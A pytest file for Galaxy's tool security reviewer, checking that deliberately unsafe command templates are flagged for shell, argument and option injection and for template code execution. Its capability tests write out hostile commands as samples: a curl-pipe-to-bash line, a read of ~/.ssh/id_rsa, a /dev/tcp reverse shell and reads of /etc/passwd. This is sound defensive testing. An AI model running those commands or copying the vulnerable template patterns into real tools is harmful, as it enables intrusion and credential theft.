"""The security review, on small tools written for one behaviour each."""

from __future__ import annotations

import os

import pytest
from Cheetah.Template import Template

from galaxy.tool_util.parser.factory import get_tool_source
from galaxy.tool_util.security import (
    Report,
    review_tool_source,
)
from galaxy.tool_util.security.charsets import (
    DASH_WORD,
    DEFAULT_SANITIZED,
    ESCAPE,
    LEADING_DASH,
    literal_rewrite,
    marks,
    PROBE,
    regex_anchored_start,
    regex_first,
    regex_removed,
    regex_universe,
    regex_word_first,
    TILDE_WORD,
)
from galaxy.tool_util.security.model import build_model
from galaxy.tool_util.security.template import (
    compile_template,
    CompileTimeExecution,
)
from galaxy.tool_util.security.validators import (
    ANY,
    expression_constraint,
)

INPUTS = """
<param name="input" type="data" format="txt"/>
<param name="flat" type="data_collection" collection_type="list"/>
<param name="nested" type="data_collection" collection_type="list:paired"/>
<param name="text" type="text"/>
<param name="word" type="text"><validator type="regex">^[A-Za-z0-9_]+$</validator></param>
<param name="prefix_only" type="text"><validator type="regex">^[A-Za-z0-9_]+</validator></param>
<param name="free" type="text"><sanitizer sanitize="false"/></param>
<param name="no_quote" type="text">
  <sanitizer><valid initial="string.printable"><remove value="&apos;"/></valid></sanitizer>
</param>
<param name="letters" type="text">
  <sanitizer><valid initial="string.ascii_letters"><add value="_"/></valid></sanitizer>
</param>
<param name="no_dash" type="text"><validator type="regex">^[^-].*$</validator></param>
<param name="words" type="text"><validator type="regex">^[A-Za-z0-9_ ]+$</validator></param>
<param name="expr_no_quote" type="text">
  <sanitizer sanitize="false"/><validator type="expression">"'" not in value</validator>
</param>
<param name="expr_alnum" type="text">
  <sanitizer sanitize="false"/><validator type="expression">not value or value.replace(':', '').isalnum()</validator>
</param>
<param name="expr_unknown" type="text">
  <sanitizer sanitize="false"/><validator type="expression">len(value) &lt; 10</validator>
</param>
<param name="dash_words" type="text">
  <validator type="regex">^[A-Za-z0-9_][A-Za-z0-9_-]*( [A-Za-z0-9_][A-Za-z0-9_-]*)*$</validator>
</param>
<param name="dash_anywhere" type="text"><validator type="regex">^[A-Za-z0-9_ -]*$</validator></param>
<param name="sq" type="text">
  <sanitizer><valid initial="string.printable"><remove value="&apos;"/></valid>
  <mapping initial="none"><add source="&apos;" target="&apos;&quot;&apos;&quot;&apos;"/></mapping></sanitizer>
</param>
<param name="no_dq" type="text">
  <sanitizer sanitize="false"/><validator type="regex">^[^"$`]*$</validator>
</param>
<param name="no_expansion" type="text">
  <sanitizer sanitize="false"/><validator type="regex">^[^\\\\$`]*$</validator>
</param>
<section name="opts" title="opts">
  <conditional name="adv">
    <param name="on" type="select"><option value="y">y</option><option value="n">n</option></param>
    <when value="y"><param name="deep" type="data" format="txt"/></when>
    <when value="n"/>
  </conditional>
</section>
<param name="choice" type="select"><option value="a">A</option><option value="b c">B</option></param>
<param name="column" type="data_column" data_ref="input" multiple="true"/>
<param name="secret" type="hidden" value="x"/>
<param name="quotes" type="text">
  <sanitizer><valid initial="string.ascii_letters"><add value="&apos;"/><add value="&quot;"/></valid></sanitizer>
</param>
<param name="count" type="integer" value="1"/>
<repeat name="rows" title="rows"><param name="label" type="text"/></repeat>
<conditional name="mode">
  <param name="kind" type="select"><option value="x">x</option><option value="y">y</option></param>
  <when value="x"><param name="value" type="text"/></when>
  <when value="y"><param name="value" type="integer" value="1"/></when>
</conditional>
"""


def review(
    tmp_path,
    command: str,
    configfiles: str = "",
    extra: str = "",
    tool_attrs: str = "",
    inputs: str = "",
    colors_validated: bool = True,
) -> Report:
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(f"""<tool id="t" name="t" version="1" profile="24.2" {tool_attrs}>
  <command><![CDATA[{command}]]></command>
  <configfiles>{configfiles}</configfiles>
  <inputs>{inputs or INPUTS}</inputs>
  <outputs><data name="out" format="txt"/></outputs>
  {extra}
</tool>""")
    return review_tool_source(get_tool_source(path), colors_validated=colors_validated)


def rules(report: Report, kind: str = "vulnerability") -> set[tuple[str, str]]:
    return {(f.rule, f.severity) for f in report.findings if f.kind == kind}


@pytest.mark.parametrize(
    "command",
    [
        "tool '$text' \"$text\" '$word' $word '$letters' $letters $count '$choice' '$input' > '$out'",
        # The sanitizer keeps everything but the single quote, and the value sits inside single quotes.
        "tool '$no_quote'",
        # Dataset names go through Galaxy's default sanitizer.
        "tool --title '$input.name' --ext $input.ext",
        # Cleaning with a class that keeps whitespace is enough inside quotes.
        "#import re\n#set $name = re.sub('[^\\s\\w\\-]', '_', str($input.element_identifier))\nln -s '$input' '${name}.txt'",
        "ln -s '$input' '${input.safe_element_identifier}.txt'",
        # A #def that cleans its argument.
        "#import re\n#def clean($v)\n#return re.sub('[^\\w.-]', '_', str($v))\n#end def\ntool '$clean($input.element_identifier)'",
        # shlex.quote makes a value safe as an unquoted word.
        "#import shlex\ntool ${shlex.quote(str($input.element_identifier))}",
        # Each cleaned name gets its own quotes from the separator.
        (
            "#import re\n#set $names = \"' '\".join([re.sub('[^\\w]', '_', str($f.element_identifier)) for $f in $flat])\n"
            "tool -names '$names'"
        ),
        # A commented-out line is not a command.
        "tool ## $text\n",
        "tool '$mode.kind' \\$GALAXY_SLOTS \"\\${TMPDIR:-.}\"",
        # repr() writes the value between quotes of its own.
        "tool ${repr(str($text))}",
        'sh -c "tool ${repr(str($text))}"',
    ],
)
def test_contained_values_are_not_reported(tmp_path, command):
    # A quoted value may still begin with a dash; that is reported separately, at low severity.
    assert {rule for rule in rules(review(tmp_path, command)) if rule != ("option-injection", "low")} == set()


@pytest.mark.parametrize(
    "command,reported",
    [
        ("tool '$input' '$text'", True),
        ("tool --name '$text'", False),
        ("tool -- '$text'", False),
        ("tool '$letters'", False),
    ],
)
def test_value_that_can_start_with_a_dash(tmp_path, command, reported):
    assert (("option-injection", "low") in rules(review(tmp_path, command))) is reported


def test_sanitizer_that_writes_a_shell_safe_quote(tmp_path):
    escaping = (
        '<inputs><param name="q" type="text"><sanitizer><valid initial="string.printable">'
        '<remove value="&apos;"/></valid><mapping initial="none"><add source="&apos;" target="&apos;&quot;&apos;&quot;&apos;"/>'
        "</mapping></sanitizer></param></inputs>"
    )
    path = os.path.join(tmp_path, "escaping.xml")
    for command, expected in [("tool --q '$q'", set()), ('tool --q "$q"', {("shell-injection", "high")})]:
        with open(path, "w") as fh:
            fh.write(
                f'<tool id="e" name="e" version="1" profile="24.2"><command><![CDATA[{command}]]></command>{escaping}</tool>'
            )
        assert rules(review_tool_source(get_tool_source(path))) == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("ln -s '$input' '$input.element_identifier'", ("shell-injection", "high")),
        ('echo "$nested.name"', ("shell-injection", "high")),
        ("#for $pair in $nested\ncp '$pair.forward' 'out/${pair.name}'\n#end for", ("shell-injection", "high")),
        ('#for $k in $flat.keys()\ntool "$k"\n#end for', ("shell-injection", "high")),
        ("tool $text", ("argument-injection", "medium")),
        ("tool '$free'", ("shell-injection", "high")),
        # repr()'s own quotes end the single quotes around it.
        ("tool '${repr(str($text))}'", ("argument-injection", "medium")),
        ("tool '${repr($text.value)}'", ("shell-injection", "high")),
        ("tool '${str($text).__repr__()}'", ("argument-injection", "medium")),
        ("sh -c \"tool '${repr(str($text))}'\"", ("nested-interpreter", "medium")),
        ('tool "$no_quote"', ("shell-injection", "high")),
        # .value and string methods return the submitted value, not the sanitized one.
        ("tool '$text.value'", ("shell-injection", "high")),
        ("tool '${text.strip()}'", ("shell-injection", "high")),
        ("#set $alias = $text.value\ntool '$alias'", ("shell-injection", "high")),
        # A regex validator without a final $ does not restrict the tail of the value.
        ("tool '$prefix_only.value'", ("shell-injection", "high")),
        # Iterating a multiple column parameter yields raw values; they are only free on an empty dataset.
        ("#for $c in $column\ntool '$c'\n#end for", ("shell-injection", "medium")),
        # A hidden parameter is whatever the client submits.
        ("tool $secret", ("argument-injection", "medium")),
        ("$text --version", ("command-position", "high")),
        ('sh -c "tool $text"', ("nested-interpreter", "medium")),
        ("awk '$1 == \"$no_quote\"' '$input'", ("nested-interpreter", "high")),
        ("python -c 'print($text)'", ("nested-interpreter", "high")),
        # Text in both branches of the conditional is one name: the text branch decides.
        ("tool $mode.value", ("argument-injection", "medium")),
        # The default sanitizer keeps '/', so a quoted value still picks its own path.
        ("tool '$input' > '$text'", ("path-traversal", "medium")),
        # The repr of a Python list brings its own quotes into the single-quoted word.
        (
            "#set $labels = [str($r.label.value) for $r in $rows]\ntool '--labels=${labels}'",
            ("shell-injection", "high"),
        ),
        # A command assembled in a Python string is lexed like template text.
        (
            "#set $cmd = \"ln -s '%s' '%s' &&\" % ($input, $input.element_identifier)\n$cmd true",
            ("shell-injection", "high"),
        ),
        # Either branch of an #if can leave the quote open.
        ("tool #if $count\n'\n#else\n\"\n#end if\n$no_quote", ("shell-injection", "high")),
    ],
)
def test_escaping_values_are_reported(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


def test_value_reaching_python_that_runs_on_the_server(tmp_path):
    command = "#import subprocess\n#set $first = subprocess.check_output('head -n1 ' + str($text), shell=True)\ntool"
    assert ("server-injection", "critical") in rules(review(tmp_path, command))
    assert ("server-injection", "high") in rules(review(tmp_path, "tool ${open(str($text)).read()}"))


def test_file_read_by_the_template_is_user_data(tmp_path):
    # The content of a dataset is the user's, wherever the template got the path from.
    assert ("shell-injection", "high") in rules(review(tmp_path, "tool ${open(str($input)).readline()}"))
    command = "#set $ids = [x.split('\\t')[0] for x in open(str($input)).readlines()]\n#for $f in $ids\nfetch '$f' &&\n#end for\ntrue"
    assert ("shell-injection", "high") in rules(review(tmp_path, command))
    own = "#import os\ntool ${open(os.path.join($__tool_directory__, 'defaults.txt')).read()}"
    assert rules(review(tmp_path, own)) == set()


SPLIT_CONTENT = {("argument-injection", "medium"), ("option-injection", "low")}


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool \\$(cat '$input') > '$out'", SPLIT_CONTENT),
        ("tool `head -n 1 '$input' | cut -f 2` > '$out'", SPLIT_CONTENT),
        ("tool \\$(sort < '$input' | grep -v '^#') > '$out'", SPLIT_CONTENT),
        ("tool \\$(cat '$input' 2> /dev/null) > '$out'", SPLIT_CONTENT),
        ("tool \\$(sort -k 2 '$input') > '$out'", SPLIT_CONTENT),
        ("tool \\$(grep -v '^#' '$input') > '$out'", SPLIT_CONTENT),
        ("tool \\$(grep -e -c '$input') > '$out'", SPLIT_CONTENT),
        ("tool \\$(cat '${input.file_name}') > '$out'", SPLIT_CONTENT),
        # Older dash splits an operand of a declaration.
        ("export X=\\$(cat '$input') && tool > '$out'", {("argument-injection", "medium")}),
        # grep's first operand is its pattern; the word names another file.
        ("tool \\$(grep '$input') > '$out'", set()),
        ("tool \\$(cat '$input'.txt) > '$out'", set()),
        ("tool --name \"\\$(cat '$input')\" > '$out'", set()),
        # The substitution writes a count, or the content goes to a file.
        ("tool \\$(cat '$input' | wc -l) > '$out'", set()),
        ("tool \\$(cat '$input' | grep -c x) > '$out'", set()),
        ("tool \\$(grep -c x < '$input') > '$out'", set()),
        ("tool \\$(sort -o sorted.txt '$input') > '$out'", set()),
        ("tool \\$(cat '$input' > copy.txt; echo ok) > '$out'", set()),
        # The shell does not split what it assigns.
        ("x=\\$(cat '$input') && tool > '$out'", set()),
        ("\\$(cat '$input') > '$out'", {("command-position", "high"), ("argument-injection", "medium")}),
    ],
)
def test_dataset_content_a_command_substitution_writes(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) == expected


def test_decompressed_dataset_content_is_not_checkable(tmp_path):
    report = review(tmp_path, "tool \\$(zcat '$input') > '$out'")
    assert rules(report) == SPLIT_CONTENT
    assert not any(f.checkable for f in report.findings)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool '$expr_no_quote'", None),
        ("tool $expr_no_quote", ("shell-injection", "high")),
        ("tool $expr_alnum", None),
        # An expression that is not understood constrains nothing.
        ("tool '$expr_unknown'", ("shell-injection", "high")),
        # Only spaces get through, and no word can be an option: a list of plain words.
        ("tool --names $words", ("argument-injection", "low")),
        ("tool --names $text", ("argument-injection", "medium")),
    ],
)
def test_validators_narrow_the_value(tmp_path, command, expected):
    found = {rule for rule in rules(review(tmp_path, command)) if rule[0] != "option-injection"}
    assert found == ({expected} if expected else set())


@pytest.mark.parametrize(
    "command,reported",
    [
        ("tool '$input' '$no_dash'", False),
        (
            "#import re\n#set $n = re.sub('^-', '_', re.sub('[^\\w.-]', '_', str($input.element_identifier)))\ntool '$n'",
            False,
        ),
        ("#import re\n#set $n = re.sub('^-|[^\\w.-]', '_', str($input.element_identifier))\ntool '$n'", False),
        ("#import re\n#set $n = re.sub('[^\\w.-]', '_', str($input.element_identifier))\ntool '$n'", True),
        # Deleting one leading dash leaves the second one of `--option`.
        (
            "#import re\n#set $n = re.sub('^-', '', re.sub('[^\\w.-]', '_', str($input.element_identifier)))\ntool '$n'",
            True,
        ),
        ("#set $n = str($text).lstrip('-')\ntool '$n'", False),
    ],
)
def test_leading_dash_removed_by_validator_or_cleaning(tmp_path, command, reported):
    assert (("option-injection", "low") in rules(review(tmp_path, command))) is reported


def test_combined_cleaning_pattern_is_cleaning(tmp_path):
    command = "#import re\n#set $n = re.sub('^-|[^\\w.-]', '_', str($input.element_identifier))\ntool '$n' $n"
    assert rules(review(tmp_path, command)) == set()


def test_double_quote_escaped_in_the_template(tmp_path):
    escaped = """#set $t = $%s.replace('"', '\\\\"')\ntool "$t\""""
    # Sound only when the value cannot bring a backslash, a dollar or a backtick of its own.
    assert rules(review(tmp_path, escaped % "no_expansion")) <= {("option-injection", "low")}
    assert ("shell-injection", "high") in rules(review(tmp_path, escaped % "free"))


def test_strings_collected_in_a_list_keep_their_quotes(tmp_path):
    # The literal '"' closes the single quotes of echo: the value is inside double quotes, not single ones.
    command = (
        "#set $a = []\n#silent $a.append('x=1')\n#if $no_quote\n"
        """#silent $a.append("t='\\"'" + str($no_quote) + "'\\"'")\n#end if\n"""
        """echo 'get(${",".join($a)})' | tool"""
    )
    assert ("shell-injection", "high") in rules(review(tmp_path, command))
    quoted = "#set $a = []\n#silent $a.append(\"--x '\" + str($text) + \"'\")\ntool ${' '.join($a)}"
    assert {rule for rule in rules(review(tmp_path, quoted)) if rule[0] != "option-injection"} == set()


def test_parameter_named_without_its_conditional(tmp_path):
    report = review(tmp_path, "ln -s '$opts.deep' '$opts.deep.element_identifier'")
    assert ("shell-injection", "high") in rules(report)


def test_file_given_to_awk_is_data_unless_it_is_the_program(tmp_path):
    content = CONFIG.format('<![CDATA[{ print "$text" }]]>')
    assert not any(
        rule == "configfile-injection" and severity != "low"
        for rule, severity in rules(review(tmp_path, "awk '{ print }' '$script'", content))
    )
    assert not any(
        rule == "configfile-injection" and severity != "low"
        for rule, severity in rules(review(tmp_path, "awk '{ print }' < '$script'", content))
    )
    program = CONFIG.format("<![CDATA[{ print $free }]]>")
    assert ("configfile-injection", "high") in rules(review(tmp_path, "awk -f '$script' '$input'", program))


def test_options_sanitize_false_removes_all_sanitization(tmp_path):
    report = review(tmp_path, "tool '$text' '$input.name'", extra='<options sanitize="false"/>')
    assert {f.source for f in report.findings if f.rule == "shell-injection"} == {
        "text param 'text'",
        "name of dataset 'input'",
    }


@pytest.mark.parametrize(
    "command,colors_validated,expected",
    [
        ('tool "$col" "$col.value"', True, set()),
        ('tool "$col" "$col.value"', False, {("shell-injection", "high")}),
        # Unquoted, the `#` of a colour comments out the rest of the line.
        ("tool $col > '$out'", True, {("argument-injection", "medium")}),
    ],
)
def test_color_param_where_galaxy_checks_colours(tmp_path, command, colors_validated, expected):
    color = '<param name="col" type="color" value="#000000"/>'
    report = review(tmp_path, command, inputs=color, colors_validated=colors_validated)
    assert {rule for rule in rules(report) if rule != ("option-injection", "low")} == expected


_DATASETS = '<param name="input" type="data" format="txt"/><param name="inputs" type="data" multiple="true"/>'


@pytest.mark.parametrize(
    "command,expected",
    [
        # The wrapper's own element identifier is the raw identifier.
        (
            "ln -s '$input._element_identifier' x && cat '$input' > '$out'",
            {("shell-injection", "high"), ("path-traversal", "medium")},
        ),
        # A history import sets the tool version from the archive.
        ("tool $input.tool_version > '$out'", {("argument-injection", "medium")}),
        # serialize() holds the element identifier.
        ("#import json\necho '$json.dumps($input.serialize())' > '$out'", {("shell-injection", "high")}),
        ("tool '${input.serialize()['source_path']}' > '$out'", set()),
        (
            "ln -s '$input' '${input.serialize()['staging_path']}' && cat '$input' > '$out'",
            {("shell-injection", "high")},
        ),
        # The datasets of a group are datasets of the input.
        (
            "#for $d in $inputs.get_datasets_for_group('g')\nln -s '$d' '$d.element_identifier' &&\n#end for\ntrue",
            {("shell-injection", "high"), ("path-traversal", "medium")},
        ),
        # Names a dataset does not have make the template fail.
        ("tool '$input.forward' '$input.tmp' > '$out'", set()),
    ],
)
def test_dataset_members(tmp_path, command, expected):
    report = review(tmp_path, command, inputs=_DATASETS)
    assert rules(report) - {("option-injection", "low")} == expected


def test_python_built_command_keeps_quoting(tmp_path):
    command = "#set $cmd = \"ln -s '%s' '%s.txt' &&\" % ($input, $letters)\n$cmd true"
    assert rules(review(tmp_path, command)) == set()


CONFIG = '<configfile name="script">{}</configfile>'
FIVE_HELPERS_DEEP = "".join(
    f"#def {name}($v)\n${inner}#slurp\n#end def\n"
    for name, inner in [("a", "b($v)"), ("b", "c($v)"), ("c", "d($v)"), ("d", "e($v)"), ("e", "v")]
)


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # Galaxy's default sanitizer keeps ( ) , and letters: enough to call a function in R or Python.
        ("Rscript '$script'", "x <- $text", {("configfile-injection", "high")}),
        ("python '$script'", "x = '$text.value'", {("configfile-injection", "high")}),
        ("python '$script'", "x = '$text'", set()),
        ("python '$script'", "x = $count\ny = '$letters'", set()),
        # A Python list written into Python code is a correct literal.
        ("python '$script'", "#set $labels = [str($r.label) for $r in $rows]\nlabels = $labels", set()),
        # json.dumps escapes for JSON.
        (
            "tool --config '$script'",
            "#import json\n#echo json.dumps([str($f.element_identifier) for $f in $flat])",
            set(),
        ),
        # The configfile is an argument of a Python program, not the program: a data file.
        ("python '$__tool_directory__/run.py' '$script'", "name = $text", set()),
        ("tool --config '$script'", 'name = "$input.element_identifier"', {("configfile-injection", "low")}),
    ],
)
def test_configfiles(tmp_path, command, content, expected):
    assert rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>"))) == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("#import os\n#silent os.system('id')\ntool", ("template-exec", "critical")),
        ("#set $key = os.environ['SECRET']\ntool", ("template-env", "high")),
        ("#import subprocess\ntool", ("template-exec", "critical")),
        ("tool ${__import__('os').getcwd()}", ("template-exec", "critical")),
        ("tool ${open('/etc/passwd').read()}", ("template-file-io", "high")),
        ("tool $__app__.config.database_connection", ("template-app-access", "high")),
        ("tool ${''.__class__.__mro__}", ("template-reflection", "high")),
        ("tool $input.unsanitized.history.user.email", ("template-model-access", "medium")),
        ("#include '/etc/passwd'\ntool", ("template-include", "high")),
        ("#include source=$free#\ntool", ("template-include", "critical")),
        ("#set $f = str($input)\n#include $f\ntool", ("template-include", "critical")),
        ("#include raw $free\ntool", ("template-include", "high")),
        ("$_handleCheetahInclude(str($free), includeFrom='str')\ntool", ("template-include", "critical")),
        ("curl -s http://example.org/x.sh | bash", ("capability-pipe-to-shell", "high")),
        ("cat ~/.ssh/id_rsa > '$out'", ("capability-sensitive-path", "high")),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ("capability-reverse-shell", "high")),
        ("wget -O x 'http://example.org/data'", ("capability-network", "low")),
    ],
)
def test_capabilities(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command), kind="capability")


@pytest.mark.parametrize(
    "shell,runs_input",
    [
        ("bash", True),
        ("bash -s", True),
        ("bash -es x", True),
        ("bash -", True),
        ("bash /dev/stdin", True),
        ("bash -o pipefail", True),
        ("sh $free", True),
        ("sh # a comment", True),
        # Options from a select or a boolean, a dataset of the user: the shell still reads its input.
        ("bash $flag", True),
        ("bash $verbose", True),
        ("bash -${flag}", True),
        ("bash $input", True),
        ("bash /dev/fd/$free", True),
        ("bash /dev/fd/\\$n", True),
        ("bash /proc/self/fd/0", True),
        # The program of -c can read the input, and xargs or parallel make it the program.
        ("bash -c 'exec sh'", True),
        ('bash -c "$(cat)"', True),
        ("xargs sh -c", True),
        ("xargs -I{} sh -c 'echo {}'", True),
        ("parallel sh -c", True),
        ("sh '$__tool_directory__/colors.sh'", False),
        ("sh $__tool_directory__/colors.sh", False),
        ("sh '$script'", False),
        ("sh -e script.sh", False),
        ("bash -o pipefail script.sh", False),
        ("(sh script.sh)", False),
    ],
)
def test_pipe_to_shell_when_the_shell_runs_its_input(tmp_path, shell, runs_input):
    inputs = (
        INPUTS
        + '<param name="flag" type="select"><option value="x">trace</option><option value="e">exit</option></param>'
        + '<param name="verbose" type="boolean" truevalue="-x" falsevalue=""/>'
    )
    configfiles = '<configfile name="script">tr a-z A-Z</configfile>'
    report = review(tmp_path, f"curl -s http://example.org/x | {shell}", configfiles, inputs=inputs)
    assert (("capability-pipe-to-shell", "high") in rules(report, kind="capability")) == runs_input


@pytest.mark.parametrize(
    "command",
    [
        # os.path only computes; a loop variable may be called like a builtin.
        "#import os\n#import re\n#import json\ntool '${os.path.basename(str($input))}'",
        "#for $file in $flat\ntool '$file' '$file.ext'\n#end for",
        "tool '$__tool_directory__/x.py' '$__user_email__'",
    ],
)
def test_ordinary_templates_have_no_capability_findings(tmp_path, command):
    assert rules(review(tmp_path, command), kind="capability") == set()


def test_tool_declarations(tmp_path):
    report = review(
        tmp_path,
        "tool",
        extra="""<code file="hooks.py"/>
<environment_variables><environment_variable name="KEY" inject="api_key"/></environment_variables>""",
    )
    assert {("tool-code-file", "high"), ("capability-api-key", "high")} <= rules(report, kind="capability")


@pytest.mark.parametrize(
    "directive",
    [
        "#compiler-settings python\nimport os\nos.system('touch {marker}')\n#end compiler-settings\n",
        "#compiler commentStartToken = __import__('os').system('touch {marker}') or '//'\n",
    ],
)
def test_compile_time_directives_are_refused_not_run(tmp_path, directive):
    marker = os.path.join(tmp_path, "ran")
    report = review(tmp_path, directive.format(marker=marker) + "tool '$input.element_identifier'")
    assert not os.path.exists(marker)
    assert ("template-compile-exec", "critical") in rules(report, kind="capability")
    with pytest.raises(CompileTimeExecution):
        compile_template(directive.format(marker=marker))


def test_module_level_code_is_not_run(tmp_path):
    marker = os.path.join(tmp_path, "ran")
    compile_template(f"#import os\n#attr x = os.system('touch {marker}')\n#silent os.system('touch {marker}')\n")
    assert not os.path.exists(marker)


def test_repeated_use_is_one_finding_with_all_lines(tmp_path):
    report = review(tmp_path, "tool $text\n&& tool $text\n&& tool $text")
    (finding,) = [f for f in report.findings if f.rule == "argument-injection"]
    assert (finding.line, finding.more_lines) == (1, (2, 3))


@pytest.mark.parametrize(
    "old,new,regex,expected",
    [
        ('"', '\\"', False, ('"', '\\"')),
        (";;", "x", False, (";", "")),
        ("/", "\\/", True, ("/", "\\/")),
        ("[|&]+", ";", True, ("|&", ";")),
        ("(;|,)", " ", True, (";,", " ")),
        # A letter can be a sanitizer token, \s matches characters that are not probes, ;* matches nothing.
        ("__gt__", ">", False, None),
        ("a", ";", False, None),
        (r"\s", ";", True, None),
        ("[^a-z]", ";", True, None),
        (";*", "'", True, None),
        (";", r"\1", True, None),
        ("", ";", False, None),
        (";", None, False, None),
    ],
)
def test_literal_rewrite(old, new, regex, expected):
    rule = literal_rewrite(old, new, regex)
    assert rule == (None if expected is None else (frozenset(expected[0]), frozenset(expected[1])))


def test_charsets():
    assert DEFAULT_SANITIZED == frozenset(" -=_.()/+*^,:?!")
    assert "-" not in regex_word_first(r"^\w+( \w[\w-]*)*$")
    assert "-" in regex_word_first(r"^[\w -]*$")
    # A lookahead inside an optional or repeated part does not apply when that part matches nothing.
    assert "-" in regex_word_first(r"^\w+(?: (?:(?!-)\w?)*[\w-]+)*$")
    assert regex_anchored_start(r"^a|^b") and regex_anchored_start(r"\Aa")
    assert not regex_anchored_start(r"^a$|b$") and not regex_anchored_start(r"(?m)^a")
    assert regex_universe(r"(?m)^[a-z]+$") == PROBE
    # A negative lookahead after the space keeps a dash from starting a word.
    assert "-" not in regex_word_first(r"(?!-)(?:[\w.:+-]| (?!-))+$")
    # `$` also matches before a newline that ends the value; `\Z` does not.
    assert regex_universe(r"^[\w .:-]+$") == frozenset(" .:-_\n")
    assert regex_universe(r"^[\w .:-]+\Z") == frozenset(" .:-_")
    assert regex_universe(r"^[a-z]+") == PROBE
    assert regex_universe(r"^[^']*$") == PROBE - {"'"}
    assert regex_removed(r"[^\w.-]") == (PROBE - frozenset("_.-"), frozenset(), False)
    assert regex_removed(r"^-|[^\w.-]") == (PROBE - frozenset("_.-"), frozenset("-"), False)
    assert regex_removed("^-+") == (frozenset(), frozenset("-"), True)
    assert regex_removed("ab") is None
    assert "-" not in regex_first(r"^[^-].*$")
    assert regex_first(r"^(?!-)[\w -]+$") == frozenset(" _")
    # Nothing is required at the start of the value.
    assert regex_first(r"[a-z]*") == PROBE
    assert expression_constraint('"\'" not in value').chars == PROBE - {"'"}
    assert expression_constraint("value.isalnum()").chars == frozenset()
    assert expression_constraint("not value.startswith('-')").lead == PROBE - {"-"}
    assert expression_constraint("all(c not in value for c in ';|&')").chars == PROBE - frozenset(";|&")
    assert expression_constraint("value.isalnum() or len(value) > 3") == ANY
    assert expression_constraint("not (value.isalnum() and value)") == ANY
    assert expression_constraint("__import__('os').system('id')") == ANY


@pytest.mark.parametrize(
    "command,expected",
    [
        # A helper that returns its argument is a function: the result is written, not what the helper wrote.
        ("#def ident($v)\n#return $v\n#end def\ntool '$ident($input.element_identifier)'", ("shell-injection", "high")),
        ("#def show($v)\n$v#slurp\n#end def\ntool '$show(v=$text.value)'", ("shell-injection", "high")),
        ("tool '${\"{v}\".format(v=$text.value)}'", ("shell-injection", "high")),
        # In $'...' a backslash escapes the quote, so the middle word is not quoted at all.
        ("tool $'\\'' $no_quote $'\\''", ("shell-injection", "high")),
        ("find . -exec sh -c 'tool \"$1\" $no_quote' _ {} \\;", ("nested-interpreter", "high")),
        # Only the first quote is removed.
        ('tool \'${text.value.replace("\'", "", 1)}\'', ("shell-injection", "high")),
        ('#import re\ntool \'${re.sub("\'", "", $text.value, 1)}\'', ("shell-injection", "high")),
        ("#set $f = lambda: $text.value\ntool '${f()}'", ("shell-injection", "high")),
        # Decoding turns letters and digits into anything.
        ("#import base64\ntool '${base64.b64decode(str($word.value)).decode()}'", ("shell-injection", "high")),
        ("echo 'x\n#capture v\n$no_quote\n#end capture\n' && tool $v", ("shell-injection", "high")),
        (FIVE_HELPERS_DEEP + "tool '$a($text.value)'", ("shell-injection", "high")),
        ("tool '${getVar('$free', '')}'", ("shell-injection", "high")),
        # getVar reads #set global values, never #set locals.
        ("#set global $g = $free\ntool '${getVar('g')}'", ("shell-injection", "high")),
        ("#set $free = 'safe'\ntool '${getVar('free')}'", ("shell-injection", "high")),
        ("#set $free = 'safe'\ntool '$getVar('free', '')'", ("shell-injection", "high")),
        # The template object's getVar, as `$self.getVar` and in Python.
        ("tool '${self.getVar('free')}'", ("shell-injection", "high")),
        ('tool \'$self.getVar("free", "")\'', ("shell-injection", "high")),
        ("#set $v = self.getVar('free')\ntool '$v'", ("shell-injection", "high")),
        ("tool $self.getVar('undeclared')", ("argument-injection", "medium")),
    ],
)
def test_escaping_values_found_by_review(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        "#set $free = 'safe'\ntool '${''.join($free for _x in [1])}'",
        "#set $free = 'safe'\n#set $f = lambda: $free\ntool '${f()}'",
        "#set $free = 'safe'\n#set $f = lambda: (lambda: $free)()\ntool '${f()}'",
        # Python 3.12 runs a comprehension in the method's frame, older versions do not.
        "#set $free = 'safe'\ntool '${''.join([$free for _x in [1]])}'",
        "#set $free = 'safe'\ntool '${''.join({$free for _x in [1]})}'",
        "#set $free = 'safe'\ntool '${''.join({$free: 1 for _x in [1]})}'",
        "#for $free in ['safe']\ntool '${''.join($free for _x in [1])}'\n#end for",
        # The #set global store comes first in the namespace.
        "#set global $g = $free\n#set $g = 'safe'\ntool '${''.join($g for _x in [1])}'",
        "#set $free = 'safe'\n#set $acc = []\n#silent $acc.extend($free for _x in [1])\ntool '${''.join($acc)}'",
        # The arguments of a #def are locals of its method.
        "#def show($free)\n${''.join($free for _x in [1])}#slurp\n#end def\ntool '$show('safe')'",
        "#def show()\n#set $free = 'safe'\n${''.join($free for _x in [1])}#slurp\n#end def\ntool '$show()'",
    ],
)
def test_names_read_inside_lambdas_and_generators_are_parameters(tmp_path, command):
    # Cheetah looks a name up in the frame that runs it: a lambda, a generator expression or a
    # comprehension does not hold the method's locals, so the name is the parameter of that name.
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        "#set $f = lambda v: $v\ntool '${f('safe')}'",
        "tool '${''.join($x for x in ['safe'])}'",
        "#set global $g = 'safe'\ntool '${''.join($g for _x in [1])}'",
        # The first iterable of a generator expression is evaluated where the expression is.
        "#set $l = ['safe']\ntool '${''.join(x for x in $l)}'",
        # A Python name is a closure over the method's local.
        "#set $s = 'safe'\ntool '${''.join(s for _x in [1])}'",
        "#set $s = 'safe'\n#set $f = lambda x=$s: $x\ntool '${f()}'",
    ],
)
def test_names_a_lambda_or_generator_binds_itself(tmp_path, command):
    compile_template(command)
    assert rules(review(tmp_path, command)) == set()


@pytest.mark.parametrize(
    "command",
    [
        "#set $f = lambda x=$free: x\ntool '${f()}'",
        "#set $f = lambda x=$free: $x\ntool '${f()}'",
        "#set $f = lambda *, x=$free: x\ntool '${f()}'",
    ],
)
